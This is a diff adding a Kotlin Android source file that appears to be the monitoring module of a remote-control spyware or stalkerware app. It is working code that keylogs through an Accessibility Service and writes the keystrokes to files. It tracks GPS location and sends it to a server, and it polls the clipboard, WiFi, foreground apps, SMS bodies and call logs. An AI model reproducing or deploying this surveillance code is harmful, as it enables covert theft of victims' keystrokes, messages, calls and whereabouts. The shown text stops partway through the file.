@@ -1,0 +1,1031 @@
+     1→package com.abuzahra.manager.executor
+     2→
+     3→import android.Manifest
+     4→import android.content.Context
+     5→import android.content.pm.PackageManager
+     6→import android.location.Location
+     7→import android.location.LocationListener
+     8→import android.location.LocationManager
+     9→import android.os.Build
+    10→import android.os.Bundle
+    11→import android.os.Looper
+    12→import android.provider.CallLog
+    13→import android.provider.Telephony
+    14→import android.util.Log
+    15→import androidx.core.app.ActivityCompat
+    16→import androidx.core.content.edit
+    17→import com.abuzahra.manager.App
+    18→import com.abuzahra.manager.api.ApiClient
+    19→import com.abuzahra.manager.service.MyAccessibilityService
+    20→import kotlinx.coroutines.CoroutineScope
+    21→import kotlinx.coroutines.Dispatchers
+    22→import kotlinx.coroutines.Job
+    23→import kotlinx.coroutines.delay
+    24→import kotlinx.coroutines.isActive
+    25→import kotlinx.coroutines.launch
+    26→import org.json.JSONArray
+    27→import org.json.JSONObject
+    28→import java.io.File
+    29→import java.text.SimpleDateFormat
+    30→import java.util.Date
+    31→import java.util.Locale
+    32→import java.util.concurrent.ConcurrentLinkedQueue
+    33→
+    34→/**
+    35→ * MonitorExecutor - Complete Implementation
+    36→ * Real monitoring functionality for keylogger, location tracking, clipboard, etc.
+    37→ */
+    38→object MonitorExecutor {
+    39→
+    40→    private const val TAG = "MonitorExecutor"
+    41→    private const val MAX_KEYLOG_SIZE = 100000
+    42→    private const val MAX_LOCATION_HISTORY = 500
+    43→    private const val MAX_CLIPBOARD_HISTORY = 100
+    44→    private const val MAX_NOTIFICATION_HISTORY = 500
+    45→
+    46→    // ===== MONITORING STATE =====
+    47→    private var keyloggerActive = false
+    48→    private var screenRecordingActive = false
+    49→    private var locationTrackingActive = false
+    50→    private var clipboardMonitorActive = false
+    51→    private var wifiMonitorActive = false
+    52→    private var appMonitorActive = false
+    53→    private var smsMonitorActive = false
+    54→    private var callMonitorActive = false
+    55→    private var notificationMonitorActive = false
+    56→
+    57→    // ===== DATA STORAGE =====
+    58→    private val keylogBuffer = ConcurrentLinkedQueue<KeylogEntry>()
+    59→    private val locationHistory = ConcurrentLinkedQueue<LocationEntry>()
+    60→    private val clipboardHistory = ConcurrentLinkedQueue<ClipboardEntry>()
+    61→    private val notificationHistory = ConcurrentLinkedQueue<NotificationEntry>()
+    62→    private val appUsageLog = ConcurrentLinkedQueue<AppUsageEntry>()
+    63→    private val geoFences = mutableListOf<GeoFence>()
+    64→    
+    65→    // ===== JOBS =====
+    66→    private var locationJob: Job? = null
+    67→    private var clipboardJob: Job? = null
+    68→    private var wifiJob: Job? = null
+    69→    private var appMonitorJob: Job? = null
+    70→    private var smsMonitorJob: Job? = null
+    71→    private var callMonitorJob: Job? = null
+    72→    
+    73→    // ===== LOCATION LISTENER =====
+    74→    private var locationListener: LocationListener? = null
+    75→
+    76→    // ===== DATA CLASSES =====
+    77→    data class KeylogEntry(
+    78→        val timestamp: Long,
+    79→        val packageName: String,
+    80→        val text: String,
+    81→        val viewType: String
+    82→    )
+    83→    
+    84→    data class LocationEntry(
+    85→        val timestamp: Long,
+    86→        val lat: Double,
+    87→        val lon: Double,
+    88→        val accuracy: Float,
+    89→        val speed: Float,
+    90→        val altitude: Double,
+    91→        val provider: String
+    92→    )
+    93→    
+    94→    data class ClipboardEntry(
+    95→        val timestamp: Long,
+    96→        val text: String,
+    97→        val sourcePackage: String?
+    98→    )
+    99→    
+   100→    data class NotificationEntry(
+   101→        val timestamp: Long,
+   102→        val packageName: String,
+   103→        val title: String?,
+   104→        val text: String?,
+   105→        val category: String?
+   106→    )
+   107→    
+   108→    data class AppUsageEntry(
+   109→        val timestamp: Long,
+   110→        val packageName: String,
+   111→        val eventType: String,
+   112→        val duration: Long
+   113→    )
+   114→    
+   115→    data class GeoFence(
+   116→        val id: String,
+   117→        val lat: Double,
+   118→        val lon: Double,
+   119→        val radius: Int,
+   120→        val active: Boolean,
+   121→        val name: String? = null
+   122→    )
+   123→
+   124→    // ===== KEYLOGGER =====
+   125→    fun keyloggerStart(): String {
+   126→        keyloggerActive = true
+   127→        val accessibility = MyAccessibilityService.getInstance()
+   128→        
+   129→        return if (accessibility != null) {
+   130→            MyAccessibilityService.setKeyloggerEnabled(true)
+   131→            "Keylogger started and connected to Accessibility Service"
+   132→        } else {
+   133→            "Keylogger started but Accessibility Service is not active. Enable it in Settings."
+   134→        }
+   135→    }
+   136→
+   137→    fun keyloggerStop(): String {
+   138→        keyloggerActive = false
+   139→        MyAccessibilityService.setKeyloggerEnabled(false)
+   140→        return "Keylogger stopped"
+   141→    }
+   142→
+   143→    fun getKeylogger(): Map<String, Any> {
+   144→        val entries = keylogBuffer.toList()
+   145→        val text = entries.joinToString("") { it.text }
+   146→        
+   147→        return mapOf(
+   148→            "active" to keyloggerActive,
+   149→            "count" to entries.size,
+   150→            "character_count" to text.length,
+   151→            "data" to text.takeLast(5000).ifBlank { "No data captured yet" },
+   152→            "entries" to entries.takeLast(50).map { 
+   153→                mapOf(
+   154→                    "time" to it.timestamp,
+   155→                    "app" to it.packageName,
+   156→                    "text" to it.text
+   157→                )
+   158→            },
+   159→            "accessibility_service" to (MyAccessibilityService.getInstance() != null)
+   160→        )
+   161→    }
+   162→    
+   163→    fun appendKeylog(packageName: String, text: String, viewType: String = "text") {
+   164→        if (keyloggerActive) {
+   165→            val entry = KeylogEntry(
+   166→                timestamp = System.currentTimeMillis(),
+   167→                packageName = packageName,
+   168→                text = text,
+   169→                viewType = viewType
+   170→            )
+   171→            keylogBuffer.add(entry)
+   172→            
+   173→            // Limit buffer size
+   174→            while (keylogBuffer.size > MAX_KEYLOG_SIZE) {
+   175→                keylogBuffer.poll()
+   176→            }
+   177→            
+   178→            // Save to file
+   179→            saveKeylogToFile(entry)
+   180→        }
+   181→    }
+   182→    
+   183→    private fun saveKeylogToFile(entry: KeylogEntry) {
+   184→        try {
+   185→            val file = File(App.instance.cacheDir, "keylog_${getDateString()}.log")
+   186→            val line = "${entry.timestamp}|${entry.packageName}|${entry.text}\n"
+   187→            file.appendText(line)
+   188→        } catch (e: Exception) {
+   189→            Log.e(TAG, "Failed to save keylog", e)
+   190→        }
+   191→    }
+   192→    
+   193→    fun getKeylogFiles(): List<File> {
+   194→        return App.instance.cacheDir.listFiles()
+   195→            ?.filter { it.name.startsWith("keylog_") && it.name.endsWith(".log") }
+   196→            ?.sortedByDescending { it.lastModified() }
+   197→            ?: emptyList()
+   198→    }
+   199→    
+   200→    fun clearKeylog(): String {
+   201→        keylogBuffer.clear()
+   202→        return "Keylog cleared"
+   203→    }
+   204→
+   205→    // ===== SCREEN RECORD =====
+   206→    fun screenRecordStart(context: Context, params: Map<String, Any> = emptyMap()): Map<String, Any> {
+   207→        screenRecordingActive = true
+   208→        Log.i(TAG, "Screen recording flag set. Screen recording requires MediaProjection permission.")
+   209→        // Attempt to delegate to ControlExecutor for actual recording
+   210→        return try {
+   211→            val result = ControlExecutor.startScreenRecording(context, params)
+   212→            mapOf(
+   213→                "monitor_flag" to true,
+   214→                "message" to "Screen recording started - delegated to ControlExecutor",
+   215→                "recording_result" to result
+   216→            )
+   217→        } catch (e: Exception) {
+   218→            Log.w(TAG, "ControlExecutor screen recording failed: ${e.message}")
+   219→            mapOf(
+   220→                "monitor_flag" to true,
+   221→                "message" to "Screen recording monitor activated. Use ControlExecutor.recordScreen() for actual MediaProjection-based recording.",
+   222→                "hint" to "Ensure screen capture permission has been granted via ScreenCaptureService.",
+   223→                "recording_result" to "delegation_failed"
+   224→            )
+   225→        }
+   226→    }
+   227→
+   228→    fun screenRecordStop(): String {
+   229→        screenRecordingActive = false
+   230→        return "Screen recording stopped"
+   231→    }
+   232→    
+   233→    fun isScreenRecordingActive(): Boolean = screenRecordingActive
+   234→
+   235→    // ===== LOCATION TRACKING =====
+   236→    fun locationLiveStart(context: Context, intervalSeconds: Int = 30): String {
+   237→        if (locationTrackingActive) {
+   238→            return "Location tracking already active"
+   239→        }
+   240→        
+   241→        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) 
+   242→            != PackageManager.PERMISSION_GRANTED &&
+   243→            ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) 
+   244→            != PackageManager.PERMISSION_GRANTED) {
+   245→            return "Location permission not granted"
+   246→        }
+   247→        
+   248→        locationTrackingActive = true
+   249→        val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
+   250→        
+   251→        // Create location listener
+   252→        locationListener = object : LocationListener {
+   253→            override fun onLocationChanged(location: Location) {
+   254→                addLocationToHistory(
+   255→                    location.latitude,
+   256→                    location.longitude,
+   257→                    location.accuracy,
+   258→                    location.speed,
+   259→                    location.altitude,
+   260→                    location.provider ?: "unknown"
+   261→                )
+   262→                
+   263→                // Check geofences
+   264→                checkGeofences(location.latitude, location.longitude, context)
+   265→                
+   266→                // Send to server
+   267→                CoroutineScope(Dispatchers.IO).launch {
+   268→                    try {
+   269→                        ApiClient.sendLocation(
+   270→                            context,
+   271→                            location.latitude,
+   272→                            location.longitude,
+   273→                            location.accuracy
+   274→                        )
+   275→                    } catch (_: Exception) {}
+   276→                }
+   277→            }
+   278→            
+   279→            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
+   280→            override fun onProviderEnabled(provider: String) {}
+   281→            override fun onProviderDisabled(provider: String) {}
+   282→        }
+   283→        
+   284→        // Request updates
+   285→        try {
+   286→            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+   287→                lm.requestLocationUpdates(
+   288→                    LocationManager.GPS_PROVIDER,
+   289→                    (intervalSeconds * 1000).toLong(),
+   290→                    10f,
+   291→                    locationListener!!,
+   292→                    Looper.getMainLooper()
+   293→                )
+   294→            }
+   295→            
+   296→            if (lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+   297→                lm.requestLocationUpdates(
+   298→                    LocationManager.NETWORK_PROVIDER,
+   299→                    (intervalSeconds * 1000).toLong(),
+   300→                    10f,
+   301→                    locationListener!!,
+   302→                    Looper.getMainLooper()
+   303→                )
+   304→            }
+   305→            
+   306→            // Get last known location immediately
+   307→            val lastKnown = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+   308→                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+   309→            
+   310→            if (lastKnown != null) {
+   311→                addLocationToHistory(
+   312→                    lastKnown.latitude,
+   313→                    lastKnown.longitude,
+   314→                    lastKnown.accuracy,
+   315→                    lastKnown.speed,
+   316→                    lastKnown.altitude,
+   317→                    lastKnown.provider ?: "unknown"
+   318→                )
+   319→            }
+   320→            
+   321→            return "Live location tracking started (interval: ${intervalSeconds}s)"
+   322→        } catch (e: Exception) {
+   323→            Log.e(TAG, "Location tracking start error", e)
+   324→            locationTrackingActive = false
+   325→            return "Error: ${e.message}"
+   326→        }
+   327→    }
+   328→
+   329→    fun locationStop(): String {
+   330→        locationTrackingActive = false
+   331→        locationListener?.let { listener ->
+   332→            try {
+   333→                val ctx = com.abuzahra.manager.App.instance
+   334→                val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
+   335→                lm.removeUpdates(listener)
+   336→                Log.i(TAG, "Location listener unregistered")
+   337→            } catch (e: Exception) {
+   338→                Log.e(TAG, "Failed to remove location listener", e)
+   339→            }
+   340→        }
+   341→        locationListener = null
+   342→        locationJob?.cancel()
+   343→        locationJob = null
+   344→        return "Location tracking stopped"
+   345→    }
+   346→
+   347→    fun isLocationTrackingActive(): Boolean = locationTrackingActive
+   348→
+   349→    fun addLocationToHistory(lat: Double, lon: Double, accuracy: Float = 0f, speed: Float = 0f, altitude: Double = 0.0, provider: String = "unknown") {
+   350→        val entry = LocationEntry(
+   351→            timestamp = System.currentTimeMillis(),
+   352→            lat = lat,
+   353→            lon = lon,
+   354→            accuracy = accuracy,
+   355→            speed = speed,
+   356→            altitude = altitude,
+   357→            provider = provider
+   358→        )
+   359→        locationHistory.add(entry)
+   360→        
+   361→        // Limit history
+   362→        while (locationHistory.size > MAX_LOCATION_HISTORY) {
+   363→            locationHistory.poll()
+   364→        }
+   365→        
+   366→        // Save to file
+   367→        saveLocationToFile(entry)
+   368→    }
+   369→
+   370→    fun getLocationHistory(): List<Map<String, Any>> {
+   371→        return locationHistory.toList().map { entry ->
+   372→            mapOf(
+   373→                "timestamp" to entry.timestamp,
+   374→                "datetime" to formatTimestamp(entry.timestamp),
+   375→                "lat" to entry.lat,
+   376→                "lon" to entry.lon,
+   377→                "accuracy" to entry.accuracy,
+   378→                "speed" to entry.speed,
+   379→                "altitude" to entry.altitude,
+   380→                "provider" to entry.provider
+   381→            )
+   382→        }
+   383→    }
+   384→    
+   385→    private fun saveLocationToFile(entry: LocationEntry) {
+   386→        try {
+   387→            val file = File(App.instance.cacheDir, "locations_${getDateString()}.json")
+   388→            val json = JSONObject().apply {
+   389→                put("timestamp", entry.timestamp)
+   390→                put("lat", entry.lat)
+   391→                put("lon", entry.lon)
+   392→                put("accuracy", entry.accuracy)
+   393→                put("speed", entry.speed)
+   394→                put("altitude", entry.altitude)
+   395→                put("provider", entry.provider)
+   396→            }
+   397→            file.appendText(json.toString() + "\n")
+   398→        } catch (_: Exception) {}
+   399→    }
+   400→    
+   401→    fun clearLocationHistory(): String {
+   402→        locationHistory.clear()
+   403→        return "Location history cleared"
+   404→    }
+   405→
+   406→    // ===== GEO FENCING =====
+   407→    fun geoAdd(params: Map<String, Any>): String {
+   408→        val arg = params["arg"]?.toString() ?: ""
+   409→        val parts = arg.split(",")
+   410→        
+   411→        return if (parts.size >= 2) {
+   412→            val lat = parts[0].trim().toDoubleOrNull()
+   413→            val lon = parts[1].trim().toDoubleOrNull()
+   414→            val radius = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 500
+   415→            val name = parts.getOrNull(3)?.trim()
+   416→            
+   417→            if (lat != null && lon != null) {
+   418→                val fence = GeoFence(
+   419→                    id = java.util.UUID.randomUUID().toString(),
+   420→                    lat = lat,
+   421→                    lon = lon,
+   422→                    radius = radius,
+   423→                    active = true,
+   424→                    name = name
+   425→                )
+   426→                geoFences.add(fence)
+   427→                saveGeofences()
+   428→                "Geofence added: ${fence.id} at ($lat, $lon) radius ${radius}m"
+   429→            } else {
+   430→                "Invalid coordinates"
+   431→            }
+   432→        } else {
+   433→            "Usage: lat,lon,radius,name"
+   434→        }
+   435→    }
+   436→
+   437→    fun geoRemove(params: Map<String, Any>): String {
+   438→        val index = params["arg"]?.toString()?.toIntOrNull() ?: -1
+   439→        
+   440→        return if (index >= 0 && index < geoFences.size) {
+   441→            val removed = geoFences.removeAt(index)
+   442→            saveGeofences()
+   443→            "Geofence removed: ${removed.id}"
+   444→        } else {
+   445→            "Invalid index. Use 0-${geoFences.size - 1}"
+   446→        }
+   447→    }
+   448→
+   449→    fun geoList(): List<Map<String, Any>> {
+   450→        return geoFences.mapIndexed { index, fence ->
+   451→            mapOf(
+   452→                "index" to index,
+   453→                "id" to fence.id,
+   454→                "lat" to fence.lat,
+   455→                "lon" to fence.lon,
+   456→                "radius" to fence.radius,
+   457→                "active" to fence.active,
+   458→                "name" to (fence.name ?: "Unnamed")
+   459→            )
+   460→        }
+   461→    }
+   462→    
+   463→    fun geoToggle(params: Map<String, Any>): String {
+   464→        val index = params["arg"]?.toString()?.toIntOrNull() ?: -1
+   465→        
+   466→        return if (index >= 0 && index < geoFences.size) {
+   467→            geoFences[index] = geoFences[index].copy(active = !geoFences[index].active)
+   468→            saveGeofences()
+   469→            "Geofence ${if (geoFences[index].active) "enabled" else "disabled"}"
+   470→        } else {
+   471→            "Invalid index"
+   472→        }
+   473→    }
+   474→    
+   475→    private fun checkGeofences(lat: Double, lon: Double, context: Context) {
+   476→        for (fence in geoFences.filter { it.active }) {
+   477→            val distance = calculateDistance(lat, lon, fence.lat, fence.lon)
+   478→            
+   479→            if (distance <= fence.radius) {
+   480→                // Buffer event locally
+   481→                com.abuzahra.manager.EventBuffer.addEvent(
+   482→                    "geofence_entered",
+   483→                    mapOf(
+   484→                        "fence_id" to fence.id,
+   485→                        "fence_name" to (fence.name ?: "Unnamed"),
+   486→                        "distance" to distance
+   487→                    )
+   488→                )
+   489→            }
+   490→        }
+   491→    }
+   492→    
+   493→    private fun calculateDistance(lat1: Double, lon1: Double, lat2: Double, lon2: Double): Float {
+   494→        val results = FloatArray(1)
+   495→        Location.distanceBetween(lat1, lon1, lat2, lon2, results)
+   496→        return results[0]
+   497→    }
+   498→    
+   499→    private fun saveGeofences() {
+   500→        try {
+   501→            val prefs = App.instance.getSharedPreferences("monitor", Context.MODE_PRIVATE)
+   502→            val json = JSONArray(geoFences.map { fence ->
+   503→                JSONObject().apply {
+   504→                    put("id", fence.id)
+   505→                    put("lat", fence.lat)
+   506→                    put("lon", fence.lon)
+   507→                    put("radius", fence.radius)
+   508→                    put("active", fence.active)
+   509→                    put("name", fence.name)
+   510→                }
+   511→            })
+   512→            prefs.edit().putString("geofences", json.toString()).apply()
+   513→        } catch (_: Exception) {}
+   514→    }
+   515→    
+   516→    private fun loadGeofences() {
+   517→        try {
+   518→            val prefs = App.instance.getSharedPreferences("monitor", Context.MODE_PRIVATE)
+   519→            val jsonStr = prefs.getString("geofences", "[]") ?: "[]"
+   520→            val json = JSONArray(jsonStr)
+   521→            
+   522→            geoFences.clear()
+   523→            for (i in 0 until json.length()) {
+   524→                val obj = json.getJSONObject(i)
+   525→                geoFences.add(GeoFence(
+   526→                    id = obj.getString("id"),
+   527→                    lat = obj.getDouble("lat"),
+   528→                    lon = obj.getDouble("lon"),
+   529→                    radius = obj.getInt("radius"),
+   530→                    active = obj.getBoolean("active"),
+   531→                    name = obj.optString("name")
+   532→                ))
+   533→            }
+   534→        } catch (_: Exception) {}
+   535→    }
+   536→
+   537→    // ===== CLIPBOARD MONITOR =====
+   538→    fun clipboardMonitorStart(context: Context): String {
+   539→        if (clipboardMonitorActive) {
+   540→            return "Clipboard monitoring already active"
+   541→        }
+   542→        
+   543→        clipboardMonitorActive = true
+   544→        
+   545→        clipboardJob = CoroutineScope(Dispatchers.IO).launch {
+   546→            var lastClipboard = ""
+   547→            
+   548→            while (isActive && clipboardMonitorActive) {
+   549→                try {
+   550→                    val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
+   551→                    val clip = clipboard.primaryClip
+   552→                    
+   553→                    if (clip != null && clip.itemCount > 0) {
+   554→                        val text = clip.getItemAt(0).text?.toString() ?: ""
+   555→                        
+   556→                        if (text.isNotEmpty() && text != lastClipboard) {
+   557→                            lastClipboard = text
+   558→                            
+   559→                            val entry = ClipboardEntry(
+   560→                                timestamp = System.currentTimeMillis(),
+   561→                                text = text,
+   562→                                sourcePackage = clip.description?.label?.toString()
+   563→                            )
+   564→                            clipboardHistory.add(entry)
+   565→                            
+   566→                            while (clipboardHistory.size > MAX_CLIPBOARD_HISTORY) {
+   567→                                clipboardHistory.poll()
+   568→                            }
+   569→                            
+   570→                            // Buffer event locally
+   571→                            com.abuzahra.manager.EventBuffer.addEvent(
+   572→                                "clipboard_change",
+   573→                                mapOf("text" to text.take(500))
+   574→                            )
+   575→                        }
+   576→                    }
+   577→                    
+   578→                    delay(2000) // Check every 2 seconds
+   579→                } catch (e: Exception) {
+   580→                    Log.e(TAG, "Clipboard monitor error", e)
+   581→                    delay(5000)
+   582→                }
+   583→            }
+   584→        }
+   585→        
+   586→        return "Clipboard monitoring started"
+   587→    }
+   588→
+   589→    fun clipboardMonitorStop(): String {
+   590→        clipboardMonitorActive = false
+   591→        clipboardJob?.cancel()
+   592→        clipboardJob = null
+   593→        return "Clipboard monitoring stopped"
+   594→    }
+   595→
+   596→    fun isClipboardMonitorActive(): Boolean = clipboardMonitorActive
+   597→    
+   598→    fun getClipboardHistory(): List<Map<String, Any>> {
+   599→        return clipboardHistory.toList().map { entry ->
+   600→            mapOf(
+   601→                "timestamp" to entry.timestamp,
+   602→                "datetime" to formatTimestamp(entry.timestamp),
+   603→                "text" to entry.text,
+   604→                "source" to (entry.sourcePackage ?: "")
+   605→            )
+   606→        }
+   607→    }
+   608→    
+   609→    fun clearClipboardHistory(): String {
+   610→        clipboardHistory.clear()
+   611→        return "Clipboard history cleared"
+   612→    }
+   613→
+   614→    // ===== WIFI MONITOR =====
+   615→    fun wifiMonitorStart(context: Context): String {
+   616→        if (wifiMonitorActive) {
+   617→            return "WiFi monitoring already active"
+   618→        }
+   619→        
+   620→        wifiMonitorActive = true
+   621→        
+   622→        wifiJob = CoroutineScope(Dispatchers.IO).launch {
+   623→            var lastWifi = ""
+   624→            
+   625→            while (isActive && wifiMonitorActive) {
+   626→                try {
+   627→                    val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+   628→                    
+   629→                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+   630→                        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) 
+   631→                            != PackageManager.PERMISSION_GRANTED) {
+   632→                            delay(30000)
+   633→                            continue
+   634→                        }
+   635→                    }
+   636→                    
+   637→                    val currentWifi = wm.connectionInfo
+   638→                    val ssid = currentWifi?.ssid?.toString() ?: "Not connected"
+   639→                    
+   640→                    if (ssid != lastWifi) {
+   641→                        lastWifi = ssid
+   642→                        
+   643→                        // Buffer event locally
+   644→                        com.abuzahra.manager.EventBuffer.addEvent(
+   645→                            "wifi_change",
+   646→                            mapOf("ssid" to ssid, "bssid" to (currentWifi?.bssid ?: ""))
+   647→                        )
+   648→                    }
+   649→                    
+   650→                    delay(30000) // Check every 30 seconds
+   651→                } catch (e: Exception) {
+   652→                    Log.e(TAG, "WiFi monitor error", e)
+   653→                    delay(60000)
+   654→                }
+   655→            }
+   656→        }
+   657→        
+   658→        return "WiFi monitoring started"
+   659→    }
+   660→
+   661→    fun wifiMonitorStop(): String {
+   662→        wifiMonitorActive = false
+   663→        wifiJob?.cancel()
+   664→        wifiJob = null
+   665→        return "WiFi monitoring stopped"
+   666→    }
+   667→
+   668→    fun isWifiMonitorActive(): Boolean = wifiMonitorActive
+   669→
+   670→    // ===== APP MONITOR =====
+   671→    fun appMonitorStart(context: Context): String {
+   672→        if (appMonitorActive) {
+   673→            return "App monitoring already active"
+   674→        }
+   675→        
+   676→        appMonitorActive = true
+   677→        
+   678→        appMonitorJob = CoroutineScope(Dispatchers.IO).launch {
+   679→            var lastApp = ""
+   680→            
+   681→            while (isActive && appMonitorActive) {
+   682→                try {
+   683→                    // Get foreground app using usage stats
+   684→                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+   685→                        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.PACKAGE_USAGE_STATS) 
+   686→                            == PackageManager.PERMISSION_GRANTED) {
+   687→                            
+   688→                            val usageStatsManager = context.getSystemService(Context.USAGE_STATS_SERVICE) 
+   689→                                as android.app.usage.UsageStatsManager
+   690→                            
+   691→                            val endTime = System.currentTimeMillis()
+   692→                            val startTime = endTime - 60000
+   693→                            
+   694→                            val usageStats = usageStatsManager.queryUsageStats(
+   695→                                android.app.usage.UsageStatsManager.INTERVAL_DAILY,
+   696→                                startTime, endTime
+   697→                            )
+   698→                            
+   699→                            val foregroundApp = usageStats
+   700→                                .filter { it.lastTimeUsed > startTime }
+   701→                                .maxByOrNull { it.lastTimeUsed }
+   702→                                ?.packageName ?: ""
+   703→                            
+   704→                            if (foregroundApp.isNotEmpty() && foregroundApp != lastApp) {
+   705→                                lastApp = foregroundApp
+   706→                                
+   707→                                val entry = AppUsageEntry(
+   708→                                    timestamp = System.currentTimeMillis(),
+   709→                                    packageName = foregroundApp,
+   710→                                    eventType = "foreground",
+   711→                                    duration = 0
+   712→                                )
+   713→                                appUsageLog.add(entry)
+   714→                                
+   715→                                // Buffer event locally
+   716→                                com.abuzahra.manager.EventBuffer.addEvent(
+   717→                                    "app_change",
+   718→                                    mapOf("package" to foregroundApp)
+   719→                                )
+   720→                            }
+   721→                        }
+   722→                    }
+   723→                    
+   724→                    delay(5000) // Check every 5 seconds
+   725→                } catch (e: Exception) {
+   726→                    Log.e(TAG, "App monitor error", e)
+   727→                    delay(10000)
+   728→                }
+   729→            }
+   730→        }
+   731→        
+   732→        return "App monitoring started"
+   733→    }
+   734→
+   735→    fun appMonitorStop(): String {
+   736→        appMonitorActive = false
+   737→        appMonitorJob?.cancel()
+   738→        appMonitorJob = null
+   739→        return "App monitoring stopped"
+   740→    }
+   741→
+   742→    fun isAppMonitorActive(): Boolean = appMonitorActive
+   743→    
+   744→    fun getAppUsageLog(): List<Map<String, Any>> {
+   745→        return appUsageLog.toList().map { entry ->
+   746→            mapOf(
+   747→                "timestamp" to entry.timestamp,
+   748→                "datetime" to formatTimestamp(entry.timestamp),
+   749→                "package" to entry.packageName,
+   750→                "event" to entry.eventType,
+   751→                "duration" to entry.duration
+   752→            )
+   753→        }
+   754→    }
+   755→
+   756→    // ===== SMS MONITOR =====
+   757→    fun smsMonitorStart(context: Context): String {
+   758→        if (smsMonitorActive) {
+   759→            return "SMS monitoring already active"
+   760→        }
+   761→        
+   762→        smsMonitorActive = true
+   763→        
+   764→        smsMonitorJob = CoroutineScope(Dispatchers.IO).launch {
+   765→            var lastSmsId = 0L
+   766→            
+   767→            while (isActive && smsMonitorActive) {
+   768→                try {
+   769→                    if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) 
+   770→                        == PackageManager.PERMISSION_GRANTED) {
+   771→                        
+   772→                        val uri = Telephony.Sms.CONTENT_URI
+   773→                        val projection = arrayOf(
+   774→                            Telephony.Sms._ID,
+   775→                            Telephony.Sms.ADDRESS,
+   776→                            Telephony.Sms.BODY,
+   777→                            Telephony.Sms.DATE,
+   778→                            Telephony.Sms.TYPE
+   779→                        )
+   780→                        
+   781→                        context.contentResolver.query(uri, projection, null, null, "${Telephony.Sms._ID} DESC LIMIT 1")?.use { cursor ->
+   782→                            if (cursor.moveToFirst()) {
+   783→                                val id = cursor.getLong(0)
+   784→                                
+   785→                                if (id > lastSmsId) {
+   786→                                    lastSmsId = id
+   787→                                    
+   788→                                    val address = cursor.getString(1)
+   789→                                    val body = cursor.getString(2)
+   790→                                    val date = cursor.getLong(3)
+   791→                                    val type = cursor.getInt(4)
+   792→                                    
+   793→                                    // Buffer event locally
+   794→                                    com.abuzahra.manager.EventBuffer.addEvent(
+   795→                                        "sms_received",
+   796→                                        mapOf(
+   797→                                            "from" to address,
+   798→                                            "body" to body,
+   799→                                            "type" to (if (type == 1) "received" else "sent")
+   800→                                        )
+   801→                                    )
+   802→                                }
+   803→                            }
+   804→                        }
+   805→                    }
+   806→                    
+   807→                    delay(10000) // Check every 10 seconds
+   808→                } catch (e: Exception) {
+   809→                    Log.e(TAG, "SMS monitor error", e)
+   810→                    delay(30000)
+   811→                }
+   812→            }
+   813→        }
+   814→        
+   815→        return "SMS monitoring started"
+   816→    }
+   817→
+   818→    fun smsMonitorStop(): String {
+   819→        smsMonitorActive = false
+   820→        smsMonitorJob?.cancel()
+   821→        smsMonitorJob = null
+   822→        return "SMS monitoring stopped"
+   823→    }
+   824→
+   825→    fun isSmsMonitorActive(): Boolean = smsMonitorActive
+   826→
+   827→    // ===== CALL MONITOR =====
+   828→    fun callMonitorStart(context: Context): String {
+   829→        if (callMonitorActive) {
+   830→            return "Call monitoring already active"
+   831→        }
+   832→        
+   833→        callMonitorActive = true
+   834→        
+   835→        callMonitorJob = CoroutineScope(Dispatchers.IO).launch {
+   836→            var lastCallId = 0L
+   837→            
+   838→            while (isActive && callMonitorActive) {
+   839→                try {
+   840→                    if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) 
+   841→                        == PackageManager.PERMISSION_GRANTED) {
+   842→                        
+   843→                        val projection = arrayOf(
+   844→                            CallLog.Calls._ID,
+   845→                            CallLog.Calls.NUMBER,
+   846→                            CallLog.Calls.DATE,
+   847→                            CallLog.Calls.DURATION,
+   848→                            CallLog.Calls.TYPE
+   849→                        )
+   850→                        
+   851→                        context.contentResolver.query(
+   852→                            CallLog.Calls.CONTENT_URI,
+   853→                            projection, null, null, "${CallLog.Calls._ID} DESC LIMIT 1"
+   854→                        )?.use { cursor ->
+   855→                            if (cursor.moveToFirst()) {
+   856→                                val id = cursor.getLong(0)
+   857→                                
+   858→                                if (id > lastCallId) {
+   859→                                    lastCallId = id
+   860→                                    
+   861→                                    val number = cursor.getString(1)
+   862→                                    val date = cursor.getLong(2)
+   863→                                    val duration = cursor.getLong(3)
+   864→                                    val type = when (cursor.getInt(4)) {
+   865→                                        CallLog.Calls.INCOMING_TYPE -> "incoming"
+   866→                                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
+   867→                                        CallLog.Calls.MISSED_TYPE -> "missed"
+   868→                                        else -> "unknown"
+   869→                                    }
+   870→                                    
+   871→                                    // Buffer event locally
+   872→                                    com.abuzahra.manager.EventBuffer.addEvent(
+   873→                                        "call_log_change",
+   874→                                        mapOf(
+   875→                                            "number" to number,
+   876→                                            "type" to type,
+   877→                                            "duration" to duration
+   878→                                        )
+   879→                                    )
+   880→                                }
+   881→                            }
+   882→                        }
+   883→                    }
+   884→                    
+   885→                    delay(15000) // Check every 15 seconds
+   886→                } catch (e: Exception) {
+   887→                    Log.e(TAG, "Call monitor error", e)
+   888→                    delay(30000)
+   889→                }
+   890→            }
+   891→        }
+   892→        
+   893→        return "Call monitoring started"
+   894→    }
+   895→
+   896→    fun callMonitorStop(): String {
+   897→        callMonitorActive = false
+   898→        callMonitorJob?.cancel()
+   899→        callMonitorJob = null
+   900→        return "Call monitoring stopped"
+   901→    }
+   902→
